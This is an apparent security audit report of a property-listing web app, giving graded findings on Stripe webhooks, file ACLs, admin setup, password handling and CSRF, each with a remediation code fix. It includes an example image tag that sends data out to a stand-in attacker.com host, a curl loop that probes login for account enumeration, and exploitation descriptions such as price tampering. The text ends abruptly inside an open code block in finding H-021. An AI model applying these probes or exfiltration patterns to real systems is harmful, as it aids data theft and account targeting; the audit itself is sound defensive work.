# Harikoa Kāinga — Independent Security & Flow Audit

**Audited:** April 28, 2026
**Codebase:** `harikoa-kainga.zip` (HouseMatch.nz / Harikoa Kāinga full-stack monorepo)
**Stack:** Express + TypeScript + Drizzle/Postgres + Stripe + Replit Object Storage + Vite/React + Wouter
**Scope:** Auth, user PII, Stripe flows, file storage, route guards, middleware order, schema, frontend flow, common-practice gaps

> **Read this first.** This audit treats `SECURITY_AUDIT_REPORT.md` (the "all critical patched ✅" doc dated Nov 1) as **incomplete**. Several issues that doc lists as "PASS" are not actually passing once you trace the middleware order and data flow. Other issues have never been raised. Everything below is graded against what a typical NZ fintech / proptech reviewer would flag before letting real money or real property data move through the system.
>
> **Format.** Each finding has a stable ID (`H-XXX`), severity, exact file:line, the problem, and a concrete fix the Replit Agent can implement. Severities:
> - 🔴 **CRITICAL** — fix before any further production traffic
> - 🟠 **HIGH** — fix before next release window
> - 🟡 **MEDIUM** — fix in normal sprint cycle
> - 🟢 **LOW** — quality / hardening, fix when convenient

---

## 0. TL;DR Triage Table

| ID | Severity | Area | One-liner |
|---|---|---|---|
| H-001 | 🔴 | Stripe | Webhook signature verification is broken — `express.json()` consumes body before `express.raw()` runs |
| H-002 | 🔴 | Stripe | Report/service price is taken from client-supplied `metadata.price` — full price tampering |
| H-003 | 🔴 | Files | `GET /objects/:objectPath` serves private files with **no ACL check** |
| H-004 | 🔴 | Files | `/generated_pdfs/*` is a public static mount — offer PDFs with buyer name/email/phone are world-readable by URL |
| H-005 | 🔴 | Auth | Email verification is **commented out** in both register and login flows |
| H-006 | 🔴 | Auth | `POST /api/admin/setup` is publicly callable — first visitor can become admin |
| H-007 | 🔴 | Auth | `POST /api/admin/invite` returns the new admin's plaintext password in the HTTP response body |
| H-008 | 🔴 | Auth | Generated temporary partner passwords are `console.log`'d in production |
| H-009 | 🔴 | Auth | Partner login response includes the full `partnerData` row, **including the scrypt password hash** |
| H-010 | 🔴 | Auth | Login error codes (`EMAIL_NOT_FOUND`, `PARTNER_ACCOUNT_DETECTED`, `EMAIL_NOT_VERIFIED`) enable account enumeration |
| H-011 | 🟠 | Auth | Password reset accepts 6-char passwords; registration requires 12 — full bypass of password policy |
| H-012 | 🟠 | Auth | Password reset does not invalidate other sessions — stolen sessions survive a reset |
| H-013 | 🟠 | Stripe | `GET /api/stripe/payment-success` has **no auth**; anyone with a `session_id` can trigger fulfilment |
| H-014 | 🟠 | Stripe | Two activation paths (webhook + success URL) use different idempotency keys → race window |
| H-015 | 🟠 | API | `PUT /api/property-images` and `POST /api/service-providers` have neither auth nor CSRF |
| H-016 | 🟠 | API | `/api/auth/login`, `/api/auth/register`, `/api/auth/logout` are not behind CSRF |
| H-017 | 🟠 | Files | Upload signed URL has no MIME, size, or extension constraints |
| H-018 | 🟠 | Config | Production `success_url` falls back to `http://localhost:5000` |
| H-019 | 🟠 | Config | No JSON body size limit set — default Express limit, easy DoS vector |
| H-020 | 🟠 | Config | CSP `imgSrc: ["'self'", "data:", "https:", "blob:"]` is effectively unrestricted |
| H-021 | 🟡 | Auth | `generateSecurePassword` uses biased modulo (`bytes[i] % 70`) |
| H-022 | 🟡 | Auth | Partner login does not regenerate session ID (customer login does — inconsistent) |
| H-023 | 🟡 | Stripe | `stripeEvents` row is inserted *after* event processing instead of in the same transaction |
| H-024 | 🟡 | DB | `storage.getUser*` returns the password hash field; one mistake away from leaking it |
| H-025 | 🟡 | Auth | CSRF token is random + not bound to session; not actively exploitable today but fragile |
| H-026 | 🟡 | Frontend | `/admin/setup` is a *public* route in `App.tsx`; setup button visible to any visitor |
| H-027 | 🟡 | Auth | No 2FA for admins — single password compromise = full takeover |
| H-028 | 🟡 | Privacy | PII columns (`buyer_email`, `buyer_phone`) stored in plaintext, no row-level access control |
| H-029 | 🟡 | Logging | `console.log` leaks phone numbers, emails, "credentials sent" markers into Replit logs |
| H-030 | 🟡 | Files | Generated PDFs written to `process.cwd()/generated_pdfs/` — ephemeral storage on Replit |
| H-031 | 🟡 | Stripe | Webhook secret falls back to `''` when env var missing — silently accepts invalid signatures (then rejects them, but the failure mode is opaque) |
| H-032 | 🟡 | Profile | Emoji-or-avatar regex on profile picture endpoint is mangled — `\\u` and `\u` escaping is inconsistent |
| H-033 | 🟢 | Ops | `server/middleware/` directory exists but is empty; `routes.ts` is 5,400+ lines |
| H-034 | 🟢 | Ops | No audit-log table for admin actions, password resets, partner verifications, offer state changes |
| H-035 | 🟢 | Ops | No request ID / correlation ID middleware; debugging Stripe issues across logs is painful |
| H-036 | 🟢 | Privacy | No GDPR / NZ Privacy Act 2020 data-export or data-delete endpoint |
| H-037 | 🟢 | Frontend | XSS surface in `chart.tsx` and `draft-viewer-modal.tsx` use `dangerouslySetInnerHTML`; verify all paths sanitise |
| H-038 | 🟢 | Ops | No `security.txt` / vulnerability disclosure policy |
| H-039 | 🟢 | Headers | Missing COOP / COEP / Cross-Origin-Resource-Policy headers; no SRI on Font Awesome CDN |
| H-040 | 🟢 | Flow | Long partner onboarding chain (signup → admin verify → Stripe pay → emailed creds) has no status-tracking page for the applicant |

---

## 1. CRITICAL FINDINGS — fix before any further production traffic

### H-001 🔴 Stripe webhook signature verification is broken

**Files:** `server/index.ts:11`, `server/routes.ts:1548`

**Problem.**
`server/index.ts` registers `app.use(express.json())` globally **before** `registerRoutes(app)` is called. Inside `registerRoutes`, the Stripe webhook tries to use a per-route raw parser:

```ts
// server/routes.ts:1548
app.post("/api/webhooks/stripe/subscription",
  express.raw({ type: 'application/json' }),
  async (req, res) => {
    ...
    event = stripe.webhooks.constructEvent(req.body, sig, process.env.STRIPE_WEBHOOK_SECRET || '');
```

By the time this raw parser runs, `req.body` has already been parsed into a plain JS object by the global `express.json()`. `stripe.webhooks.constructEvent` requires the **exact original byte buffer** — a re-stringified object will not produce a matching signature (key order, whitespace, escape rules differ). Result: every real webhook is rejected at `constructEvent`, the catch logs `❌ Webhook signature verification failed`, and downstream subscription/listing activation logic in the webhook never runs.

This means the system is silently relying entirely on the `payment-success` URL redirect to fulfil purchases — which has its own bugs (see H-013, H-014).

**Fix.** Mount the raw parser on the webhook path *before* the global JSON parser. Replace `server/index.ts` lines 11–12 with:

```ts
// CRITICAL: Stripe webhook needs the raw body for signature verification.
// This must run BEFORE express.json().
app.use('/api/webhooks/stripe', express.raw({ type: 'application/json' }));

app.use(express.json({ limit: '100kb' }));   // also see H-019
app.use(express.urlencoded({ extended: false, limit: '100kb' }));
```

Then remove the per-route `express.raw(...)` from `routes.ts:1548` (it becomes redundant and confusing).

**Verify.**
1. Use Stripe CLI: `stripe listen --forward-to https://<host>/api/webhooks/stripe/subscription`
2. Trigger `stripe trigger checkout.session.completed`
3. Look for `✅ Event evt_... stored successfully` in logs and a row in `stripe_events`.

---

### H-002 🔴 Report price is taken from client-supplied metadata

**Files:** `server/routes.ts:3603–3616`, `client/src/pages/reports.tsx:259–266`

**Problem.**
The reports/services branch of `/api/stripe/create-checkout-session` accepts `metadata.price` from the request body and uses it directly as the Stripe `unit_amount`:

```ts
// server/routes.ts:3603
if (planType === 'report' || planType === 'service') {
  if (!metadata || !metadata.price || !metadata.name) { ... }
  planInfo = {
    price: metadata.price,           // ← attacker-controlled
    name: metadata.name,             // ← attacker-controlled
    description: metadata.description,
  };
}
```

The frontend currently sends the real price from `reportConfig.ts`, but a user with DevTools can intercept the request and change `metadata.price` from `84500` to `1` and pay 1¢ for an $845 LIM report.

**Fix.** The server already imports `reportTypes` from `@shared/reportConfig`. Use `planId` to look up the canonical price server-side:

```ts
} else if (planType === 'report' || planType === 'service') {
  const reportConfig = reportTypes[planId];
  if (!reportConfig) {
    return res.status(400).json({ message: "Unknown report or service" });
  }
  planInfo = {
    price: reportConfig.ourPriceCents,  // ← authoritative
    name: reportConfig.name,
    description: reportConfig.description,
  };
  // Optional: validate that the user-supplied propertyId is owned by req.user.id
  // before allowing them to order a report scoped to that property.
}
```

For bundle purchases, do the same with a server-side bundle config (don't read `bundlePriceCents` from the request).

**Verify.** With Stripe CLI, attempt a checkout with a tampered price; server should ignore it and create the session at the correct amount. Add an assertion test that submits `metadata.price = 1` and asserts the resulting Stripe session `amount_total` equals the configured price.

---

### H-003 🔴 `/objects/:objectPath` returns private files with no ACL check

**File:** `server/routes.ts:2253–2267`

**Problem.**

```ts
app.get("/objects/:objectPath(*)", async (req, res) => {
  const objectFile = await objectStorageService.getObjectEntityFile(req.path);
  objectStorageService.downloadObject(objectFile, res);  // ← no ACL check
});
```

The comment above this endpoint says *"used to serve private objects that can be accessed publicly"* — that comment is the bug. `objectAcl.ts` defines `canAccessObject` that checks `aclPolicy.owner === userId`, but the download endpoint never calls it. Anyone who knows or guesses the URL pattern (e.g. via Sentry, email forwarding, browser history, server logs) can fetch any uploaded file.

**Fix.** Require auth and check ACL:

```ts
import { ObjectPermission } from "./objectAcl";

app.get("/objects/:objectPath(*)", async (req: any, res) => {
  const userId = req.user?.id; // optional — public objects allowed for anonymous READ
  const objectStorageService = new ObjectStorageService();
  try {
    const objectFile = await objectStorageService.getObjectEntityFile(req.path);
    const allowed = await objectStorageService.canAccessObjectEntity({
      userId,
      objectFile,
      requestedPermission: ObjectPermission.READ,
    });
    if (!allowed) return res.sendStatus(403);
    return objectStorageService.downloadObject(objectFile, res);
  } catch (e) {
    if (e instanceof ObjectNotFoundError) return res.sendStatus(404);
    return res.sendStatus(500);
  }
});
```

Also: when files are first uploaded (via `/api/objects/upload` → signed PUT), the server-side normalisation step (currently `PUT /api/property-images`, see H-015) is the right place to call `trySetObjectEntityAclPolicy` and **set `owner: req.user.id`** on the object metadata. Without that step, `canAccessObject` returns `false` for everything, including the legitimate owner.

**Verify.** Upload as user A, copy the `/objects/...` URL, log out and try to fetch — must return 403. Log in as user B — must also return 403. As user A — must succeed.

---

### H-004 🔴 Generated offer PDFs are publicly served

**Files:** `server/routes.ts:67–72` (mount), `server/routes.ts:2575–2580`, `server/routes.ts:4567`

**Problem.**

```ts
// server/routes.ts:72
app.use('/generated_pdfs', express.static(pdfsDir));
```

Then offers write `express-interest-<offerId>.pdf` into that directory. I extracted text from one of the bundled PDFs and confirmed it contains:

- Buyer full name
- Buyer email address
- Buyer phone number
- Property address, lot number, certificate of title
- Offer price
- Conditions and settlement period

The `express.static` mount serves these with no auth. Offer IDs are UUIDs, but they leak through:

- Email links (PDFs are emailed to buyer + seller as URLs in some flows)
- Sentry events
- Replit deployment logs (logged repeatedly during generation)
- Server access logs / proxy logs

**Fix (do all three):**

1. **Stop serving the PDFs as static files.** Remove the `app.use('/generated_pdfs', express.static(pdfsDir))` line.
2. **Move PDFs into Object Storage** (`getObjectEntityUploadURL` flow) with `aclPolicy.owner = buyerId` and an ACL rule allowing the seller (once H-003 is fixed and ACL groups are wired up — see H-003 follow-up).
3. **Add an authenticated download endpoint** that resolves an offer ID to its PDF, checks `req.user.id === offer.buyerId || req.user.id === offer.sellerId || req.user.isAdmin`, then streams from object storage.

```ts
app.get("/api/offers/:id/pdf", requireAuth, async (req: any, res) => {
  const offer = await storage.getOffer(req.params.id);
  if (!offer) return res.sendStatus(404);
  const allowed =
    offer.buyerId === req.user.id ||
    offer.sellerId === req.user.id ||
    req.user.isAdmin;
  if (!allowed) return res.sendStatus(403);
  // stream from object storage
});
```

4. As an interim mitigation while migrating, you can short-circuit the static mount by gating it behind `requireAuth` and a per-request ownership check, but the proper fix is to move off the local filesystem (also fixes H-030).

**Verify.** Once migrated, attempt to fetch `/generated_pdfs/...` directly — must return 404. Attempt to fetch `/api/offers/<other-user-offer-id>/pdf` — must return 403.

---

### H-005 🔴 Email verification is disabled in both register and login

**File:** `server/auth.ts:128–131`, `server/auth.ts:220–234`

**Problem.**

```ts
// server/auth.ts: in LocalStrategy verify
// ✅ EMAIL VERIFICATION CHECK
// TEMPORARILY DISABLED - TODO: Re-enable when Gmail is fully configured
// if (!user.isVerified) {
//   return done(null, false, { message: 'EMAIL_NOT_VERIFIED' });
// }
```

```ts
// server/auth.ts: in /api/auth/register
const user = await storage.createUser({
  ...
  isVerified: true, // Auto-verified until Gmail is fully configured
});
```

This means anyone can register with someone else's email (or a typo), be auto-logged in, and start submitting offers / making payments tied to that email. There is no proof the registrant controls the email address they entered.

This is especially serious because offer submission emails, password resets, and Stripe receipts all flow to whatever email the user typed. An attacker who registers `victim@example.com` and is auto-logged-in *also* receives offer/contract emails for properties under that account.

**Fix.**

1. Decide the production email transport (the codebase has `gmail-email.ts`, `email-verification.ts`, and an `EmailService` — pick one and wire it up).
2. Set `isVerified: false` at registration. Generate the token. Store. Send.
3. In `/api/auth/register`, **do not** auto-login. Return a flag like `requiresVerification: true` and let the frontend route to a "check your inbox" page.
4. Re-enable the `EMAIL_NOT_VERIFIED` branch in the LocalStrategy.
5. Keep the existing `/api/auth/resend-verification` (already implemented). Add UX for it.

If you genuinely need a "soft launch with auto-verified accounts" mode, gate it behind an env var that throws in production:

```ts
const SKIP_EMAIL_VERIFICATION = process.env.SKIP_EMAIL_VERIFICATION === 'true';
if (SKIP_EMAIL_VERIFICATION && process.env.NODE_ENV === 'production') {
  throw new Error('SKIP_EMAIL_VERIFICATION cannot be used in production');
}
```

**Verify.** Register with a typo'd email; attempt to log in; expect 403 with `EMAIL_NOT_VERIFIED`. Verify via emailed link; log in succeeds.

---

### H-006 🔴 Public admin-setup endpoint

**Files:** `server/auth.ts:552–612`, `client/src/App.tsx:53`

**Problem.** `POST /api/admin/setup` allows the first user to become admin **if no admin exists yet**:

```ts
app.post('/api/admin/setup', async (req, res) => {
  ...
  if (existingAdmin) return res.status(403).json(...);
  // else create admin
});
```

There is **no rate limit beyond the global one, no setup token, no IP allow-list**, and the endpoint is registered **before** the global `/api` CSRF middleware (CSRF doesn't protect it either — see H-016). The frontend route `/admin/setup` is also public (`App.tsx:53`).

This means: in any window where the admin row is missing — fresh deploy, accidental admin deletion, or DB restore from a too-old backup — the first attacker to hit `/api/admin/setup` becomes the platform admin. Combined with the unprotected admin endpoints behind `requireAdmin`, that's full compromise.

**Fix.**

1. Require an `ADMIN_SETUP_TOKEN` env var. Reject if missing or mismatched:
   ```ts
   const token = req.headers['x-admin-setup-token'];
   if (!process.env.ADMIN_SETUP_TOKEN || token !== process.env.ADMIN_SETUP_TOKEN) {
     return res.status(403).json({ message: "Setup not permitted" });
   }
   ```
2. Make the `/admin/setup` frontend route private — require knowledge of the token to display the form.
3. Add aggressive rate limit (e.g. 3 attempts / 24h / IP).
4. Log every attempt (success or fail) to an `audit_log` table (see H-034).
5. Also raise the password minimum from `8` (line 561) to `12` for parity with the customer registration policy.

**Verify.** Without the env var or wrong token, `POST /api/admin/setup` returns 403. With correct token, exactly one admin can be created; subsequent attempts return 403.

---

### H-007 🔴 Admin invite endpoint returns plaintext password in response body

**File:** `server/auth.ts:615–668`

**Problem.**

```ts
// server/auth.ts:659–663
res.status(201).json({
  message: "Admin account created successfully",
  email: newAdmin.email,
  temporaryPassword: temporaryPassword // ← sent to caller in HTTP response
});
```

The temporary password is also accepted as `req.body.temporaryPassword` (i.e. the inviting admin chooses it — line 624 — already poor practice; admins shouldn't pick passwords for others) AND echoed back in the response. That response will appear in any HTTP logs, browser network panels, screen recordings of the admin panel, etc.

**Fix.**

1. Server generates the temp password (use the existing `generateSecurePassword`, fixed per H-021).
2. Server emails the password directly to the new admin (use `EmailService`).
3. Server forces `mustChangePassword: true` flag on the new admin row; first login redirects to set a new password.
4. The HTTP response contains only `{ message, email }` — never the password.

```ts
const tempPassword = generateSecurePassword(16);
const hashed = await hashPassword(tempPassword);
await db.insert(users).values({ ..., password: hashed, mustChangePassword: true });
await EmailService.sendAdminInvite({ email, tempPassword, invitedBy: req.user.email });
res.status(201).json({ message: "Admin invited; credentials emailed.", email });
```

5. Add a `must_change_password` boolean column to `users` and enforce in the login flow: if true, the only allowed action post-login is hitting `/api/auth/change-password`, then the flag clears.

---

### H-008 🔴 Temporary partner password logged to console in production

**File:** `server/routes.ts:4937`

**Problem.**

```ts
// server/routes.ts:4937
console.log('🔑 Temporary password (DO NOT LOG IN PRODUCTION):', temporaryPassword);
```

The comment knows. The code does it anyway, unconditionally. Replit deployment logs are accessible to anyone with the workspace; they may also be picked up by Sentry breadcrumbs depending on configuration. This is the same `generateSecurePassword` value that gets emailed to a real partner with admin rights to your service-partner portal.

**Fix.** Delete the line. If you need to know the password was generated, log only a non-reversible marker:

```ts
console.log(`🔑 Temporary password generated for partner ${partner.email} (length: ${temporaryPassword.length})`);
```

Same applies to anywhere else `temporaryPassword` is logged. Search the repo for any `console.log` containing `password` and remove.

```bash
grep -rn "console\.log.*[Pp]assword\|console\.log.*credentials" server/ client/src/
```

---

### H-009 🔴 Partner login response includes the password hash

**File:** `server/partner-auth.ts:352–356`

**Problem.**

```ts
// server/partner-auth.ts:352
res.json({
  success: true,
  user: user.partnerData,   // ← full row from `partner_users`, includes `password` (scrypt hash)
});
```

`partnerUsers.password` is in the schema (`shared/schema.ts:1401`) and `partnerData` is the full SELECT result. The client receives the scrypt hash on every successful login. Hashes can be brute-forced offline; even if scrypt is strong, this is a needless exposure that also breaks any compliance review.

**Fix.** Strip sensitive fields before responding. The cleanest approach is a serializer:

```ts
// server/partner-auth.ts top-level
function publicPartnerUser(p: PartnerUser) {
  const { password, ...safe } = p;
  return safe;
}

// in login response:
res.json({ success: true, user: publicPartnerUser(user.partnerData) });
```

Apply the same pattern to `/partner/auth/status` (line 374) which currently returns `user.partnerData` too. Audit all places that respond with a full `users` or `partnerUsers` row — see H-024.

**Verify.** Hit `POST /partner/login` and `GET /partner/auth/status`; response JSON must not contain a `password` key.

---

### H-010 🔴 Login flow enables account enumeration

**Files:** `server/auth.ts:301–325`, `server/partner-auth.ts:314–339`

**Problem.** The login error responses return distinct codes:

- `EMAIL_NOT_FOUND` — "No account found with this email. Would you like to create one?"
- `PARTNER_ACCOUNT_DETECTED` — "This is a partner account."
- `EMAIL_NOT_VERIFIED` — "Please verify your email."
- `Invalid email or password` — wrong password

This is a UX win and a security loss: it lets an attacker enumerate which emails are registered (and which type), enabling targeted phishing, credential stuffing, and harassment. The forgot-password endpoint (`server/routes.ts:2421`) does this correctly — it always returns "if an account exists…" regardless of whether the email is in the DB. Login should match.

**Fix.** Return a uniform error for all of:
- Email doesn't exist
- Wrong password
- Wrong system (regular vs partner)

```ts
return res.status(400).json({
  success: false,
  message: "Invalid email or password.",
  code: "INVALID_CREDENTIALS"
});
```

Keep `EMAIL_NOT_VERIFIED` only **after** valid credentials are confirmed (so this code is only ever returned when the password is right) — that one is OK because it doesn't tell an attacker anything they couldn't infer post-credential-stuffing anyway. But consider just returning a generic "Account not yet usable" instead.

If you want to keep the "this email is on the partner system, click here" UX flow, implement it post-auth: after the user successfully logs in via the wrong portal, redirect with a success-side message ("Heads-up — you also have a service-partner account. View it here.") rather than leaking pre-auth.

**Verify.** Run an enumeration test:
```bash
for email in real@example.com fake@example.com partner@example.com; do
  curl -s -X POST localhost:5000/api/auth/login \
    -H 'Content-Type: application/json' -d "{\"email\":\"$email\",\"password\":\"x\"}"
done
```
All three responses must be byte-identical (modulo timing — see H-025 for timing-attack hardening).

---

## 2. HIGH FINDINGS — fix before next release

### H-011 🟠 Password reset accepts 6-character passwords

**File:** `server/routes.ts:2480`

**Problem.**

```ts
if (newPassword.length < 6) {
  return res.status(400).json({ message: "Password must be at least 6 characters long" });
}
```

Registration requires 12 (`server/auth.ts:195`). Reset requires 6. Anyone who triggers a forgot-password flow can downgrade their account to a 6-character password, defeating the whole policy. Also no complexity check (no requirement for digit, symbol, or mixed case).

**Fix.** Centralise password policy:

```ts
// shared/passwordPolicy.ts
export const PASSWORD_MIN_LENGTH = 12;
export function validatePassword(p: string): string | null {
  if (!p || p.length < PASSWORD_MIN_LENGTH) return `Password must be at least ${PASSWORD_MIN_LENGTH} characters`;
  if (!/[A-Z]/.test(p)) return 'Password must contain at least one uppercase letter';
  if (!/[a-z]/.test(p)) return 'Password must contain at least one lowercase letter';
  if (!/[0-9]/.test(p)) return 'Password must contain at least one digit';
  return null;
}
```

Use it in registration, password reset, admin setup, admin invite, and any password-set flow. Remove all duplicated `length < N` checks.

---

### H-012 🟠 Password reset doesn't invalidate existing sessions

**File:** `server/routes.ts:2472–2508`

**Problem.** After `updateUserPassword`, the user's *other* logged-in sessions (other devices, an attacker's session if the reason for resetting is suspected compromise) are still valid. Industry standard is to revoke all sessions for the user.

**Fix.** With `connect-pg-simple` storing sessions in `user_sessions`, you can delete them by user:

```ts
// after password update
await db.execute(sql`
  DELETE FROM user_sessions
  WHERE sess->>'passport' IS NOT NULL
    AND (sess->'passport'->>'user') = ${tokenData.userId}
`);
```

(Adjust depending on what you serialize; passport-local stores the user ID.) Also send an email: "Your password was reset. If this wasn't you, click here." Same pattern in any partner password change once that flow exists (H-022).

---

### H-013 🟠 `payment-success` endpoint has no auth

**File:** `server/routes.ts:3718`

**Problem.**

```ts
app.get("/api/stripe/payment-success", async (req: any, res: any) => {
  ...
  const { session_id } = req.query;
```

The route is `GET` (so it gets called from a redirect from Stripe), accepts only a `session_id`, and triggers property activation, transaction inserts, purchase order creation, and email sends. Anyone with a `session_id` can re-trigger fulfilment until idempotency catches up. Worse, **GETs should not have side effects** — search engines, link previews, browser pre-fetchers all hit GET URLs.

**Fix.** Move all fulfilment logic into the **webhook** (which becomes the single source of truth once H-001 is fixed). The success page becomes a pure read:

```ts
app.get("/api/stripe/payment-success", requireAuth, async (req: any, res) => {
  const { session_id } = req.query;
  const [paymentSession] = await db.select()
    .from(propertyPaymentSessions)
    .where(and(
      eq(propertyPaymentSessions.stripeSessionId, session_id as string),
      eq(propertyPaymentSessions.userId, req.user.id),  // ← ownership
    ));
  if (!paymentSession) return res.status(404).json({ message: 'Not found' });
  // Just report status. Do NOT mutate.
  return res.json({
    status: paymentSession.status,
    propertyId: paymentSession.propertyId,
    planType: paymentSession.planType,
  });
});
```

If a user lands on the success page before the webhook fires, the frontend polls (or shows "Processing… we'll email you when complete"). This eliminates double-fulfilment and removes auth bypass via shared URLs.

---

### H-014 🟠 Two activation paths with mismatched idempotency

**Files:** `server/routes.ts:1669–1725` (webhook), `server/routes.ts:3779–3856` (success URL)

**Problem.** Both code paths can activate a property, but use different gates:
- Webhook: `if (existingProperty.paymentStatus === 'paid') return;`
- Success URL: `if (paymentSession.status === 'completed') return;`

If both fire concurrently (which they will once H-001 is fixed — Stripe redirects the user *and* sends the webhook in parallel), you can hit a race where:
1. Webhook reads `paymentStatus === 'pending'`, proceeds.
2. Success URL reads `paymentSession.status === 'pending'`, proceeds.
3. Both write — duplicate transaction rows, duplicate purchase orders, possibly duplicate emails.

**Fix.** With H-013 applied (success URL becomes read-only), the race goes away. As an extra belt-and-braces, do all webhook writes inside a single Postgres transaction, and include the `stripeEvents` insert in the same transaction (see H-023):

```ts
await db.transaction(async (tx) => {
  // 1. Insert into stripeEvents (PRIMARY KEY = event.id ensures idempotency)
  await tx.insert(stripeEvents).values({
    stripeEventId: event.id, eventType: event.type, ...
  }).onConflictDoNothing();

  // 2. Activate property / record transaction / create purchase order
  // ...
});
```

The `onConflictDoNothing()` on the unique `stripeEventId` is your idempotency key.

---

### H-015 🟠 Several POSTs missing auth or CSRF

**File:** `server/routes.ts`

| Line | Endpoint | Missing |
|---|---|---|
| 2282 | `PUT /api/property-images` | auth, ownership check, MIME/path validation |
| 2353 | `POST /api/service-providers` | auth, admin check, CSRF |

`PUT /api/property-images` is supposed to be the post-upload normalisation step (per H-003 fix). It must be authenticated, must verify the upload URL was issued to the calling user (track issued upload IDs in a short-lived table or signed JWT), and must call `trySetObjectEntityAclPolicy` to set `owner: req.user.id` so the ACL check in H-003 actually works.

`POST /api/service-providers` is currently an **open registration endpoint for service providers** with no admin gating. Anyone can spam fake providers into your DB. Either gate behind `requireAdmin` or convert into a partner-self-signup that goes into `pending` status (matching the partner-signup flow pattern).

**Fix.** Add middleware:

```ts
app.put("/api/property-images", csrfProtection, requireAuth, async (req: any, res) => {
  // Validate the imageURL belongs to this user (track upload tokens),
  // then call trySetObjectEntityAclPolicy with owner=req.user.id.
});

app.post("/api/service-providers", csrfProtection, requireAuth, requireAdmin, async (req, res) => {
  // ...existing logic
});
```

---

### H-016 🟠 Login / Register / Logout missing CSRF protection

**Files:** `server/auth.ts:181, 283, 370`; `server/routes.ts:451–456`

**Problem.** `setupAuth(app)` runs at line 451, registering `/api/auth/register`, `/api/auth/login`, `/api/auth/logout` directly on the app. Then at line 456, `app.use('/api', csrfProtection)` is registered. Express middleware apply at request time in registration order, but **a route handler that responds without calling `next()` ends the chain** — so for these specific routes, the `csrfProtection` middleware registered later never runs. None of register/login/logout has inline `csrfProtection` either.

The most concerning of these is **login CSRF / login fixation**: a malicious site can submit a hidden cross-site form to `/api/auth/login` with the *attacker's* credentials. Because `sameSite: 'lax'` allows cookies on top-level form submissions, the victim's browser ends up logged in as the attacker. The victim then uploads property documents, makes offers, etc., into the attacker's account, which the attacker later signs into and harvests.

**Fix.** Add `csrfProtection` middleware *into* `setupAuth` so each endpoint has it inline, and pass the middleware function in via `setupAuth(app, csrfProtection)` (or import it from a shared module). Specifically:

```ts
// server/auth.ts
app.post("/api/auth/register", csrfProtection, authLimiter, async (req, res) => { ... });
app.post("/api/auth/login",    csrfProtection, authLimiter, (req, res, next) => { ... });
app.post("/api/auth/logout",   csrfProtection, (req, res) => { ... });
```

Move `csrfProtection` to a separate module (`server/middleware/csrf.ts`) — that empty `server/middleware/` directory exists for a reason; use it (H-033).

For the login fixation concern specifically: `req.session.regenerate(...)` is already called on successful login (auth.ts:339), which mitigates fixation post-login. Still add CSRF for defence in depth.

---

### H-017 🟠 Upload signed URLs have no constraints

**File:** `server/objectStorage.ts:134–155`

**Problem.** `getObjectEntityUploadURL` calls `signObjectURL` with `method: "PUT"` and `ttlSec: 900`. There's no content-type restriction, no size cap, no extension allowlist. The signed URL is fully open within those 15 minutes — the user (or anyone they share it with) can `curl -X PUT` an arbitrary 5GB executable.

**Fix.** Use Google Cloud's V4 signed URL conditions to constrain `content-type` and `content-length-range`. The Replit sidecar `/object-storage/signed-object-url` endpoint may not currently support this — if not, validate post-upload:

1. Issue the signed URL.
2. Track the upload ID in a short-lived `pending_uploads` table with `userId, expectedMaxSize, allowedMimePrefixes`.
3. After the client tells you the upload completed (`PUT /api/property-images` flow), the server reads the object metadata (`file.getMetadata()`) and **rejects** anything that doesn't match. If invalid, delete the object.

```ts
const [meta] = await objectFile.getMetadata();
if (!ALLOWED_IMAGE_MIME.includes(meta.contentType)) {
  await objectFile.delete();
  return res.status(400).json({ message: 'Invalid file type' });
}
if (Number(meta.size) > MAX_IMAGE_BYTES) {
  await objectFile.delete();
  return res.status(400).json({ message: 'File too large' });
}
```

Also `uploadLimiter` (20 / 15min) is OK but tighten to 10 — property images don't need 20 in 15 minutes.

---

### H-018 🟠 Production success/cancel URLs fall back to localhost

**Files:** `server/routes.ts:1504–1505`, `server/routes.ts:3663–3664`

**Problem.**

```ts
success_url: `${process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : 'http://localhost:5000'}/payment-success?session_id={CHECKOUT_SESSION_ID}`,
```

`REPLIT_DEV_DOMAIN` is the dev preview domain — it's not set in production deployments. So in prod, this falls back to `http://localhost:5000`, which Stripe will redirect users to and they'll get a connection refused. The other Stripe call (`server/routes.ts:1504`) uses `REPLIT_DOMAINS` instead — different env var, different fallback.

**Fix.** Single source of truth, fail loud if not configured:

```ts
function getPublicBaseUrl(): string {
  const url = process.env.PUBLIC_BASE_URL
    || process.env.REPLIT_DOMAINS?.split(',')[0]
    || (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : null);
  if (!url) {
    if (process.env.NODE_ENV === 'production') {
      throw new Error('PUBLIC_BASE_URL must be set in production');
    }
    return 'http://localhost:5000';
  }
  return url.startsWith('http') ? url : `https://${url}`;
}
```

Use `getPublicBaseUrl()` everywhere a public URL is built (Stripe success/cancel, password reset emails, verification emails).

---

### H-019 🟠 No body size limits

**File:** `server/index.ts:11–12`

**Problem.** Default Express body size is 100kb (which is fine for JSON) but `express.urlencoded({ extended: false })` allows arbitrary form size by default in some versions, and there's no explicit cap. With AI endpoints accepting prompts and offer endpoints accepting nested objects, set explicit limits:

**Fix.**

```ts
app.use(express.json({ limit: '256kb' }));
app.use(express.urlencoded({ extended: false, limit: '256kb' }));
```

For specific endpoints that legitimately need more (e.g. AI search with 50+ properties), opt in at the route level.

---

### H-020 🟠 CSP allows `https:` and `blob:` for images

**File:** `server/routes.ts:95`

**Problem.**

```ts
imgSrc: ["'self'", "data:", "https:", "blob:"],
```

`https:` is essentially a wildcard for image sources. While image XSS is harder than script XSS, CSP `imgSrc: https:` lets an attacker inject `<img src="https://attacker.com/log?cookie=...">` (well, cookies aren't in URL — but they can use `<img src>` to exfiltrate other DOM data). Tighten to known sources:

**Fix.**

```ts
imgSrc: [
  "'self'",
  "data:",
  "blob:",
  "https://storage.googleapis.com",
  "https://*.storage.googleapis.com",
  "https://media.trademe.co.nz",          // if you embed TradeMe images
  "https://www.googletagmanager.com",
  "https://www.google-analytics.com",
],
```

Same exercise for `connectSrc` — currently it includes `wss:` and `ws:` wildcards which let any WebSocket be opened.

Add `frame-src: https://js.stripe.com https://hooks.stripe.com` so Stripe Elements can iframe (you'll need this when you add Stripe Elements for in-page card collection). Add `frame-ancestors: 'none'` (or `'self'`) to prevent clickjacking — this replaces the older `X-Frame-Options`.

---

## 3. MEDIUM FINDINGS

### H-021 🟡 `generateSecurePassword` has modulo bias

**File:** `server/routes.ts:2404–2412`

**Problem.**

```ts
const chars = "ABCDEFGHI...!@#$%^&*";  // 70 chars
